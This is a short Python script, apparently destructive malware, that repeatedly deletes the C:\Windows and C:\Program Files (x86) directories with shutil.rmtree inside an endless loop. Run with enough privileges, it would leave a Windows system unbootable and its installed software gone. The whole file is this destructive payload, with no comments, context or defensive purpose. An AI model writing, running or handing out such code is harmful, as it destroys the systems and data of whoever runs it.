import shutil
i = int (0)
path2 = (r"C:\Program Files (x86)")
path = (r"C:\Windows")
while i == 0:	
	shutil.rmtree(path)
	shutil.rmtree(path2)
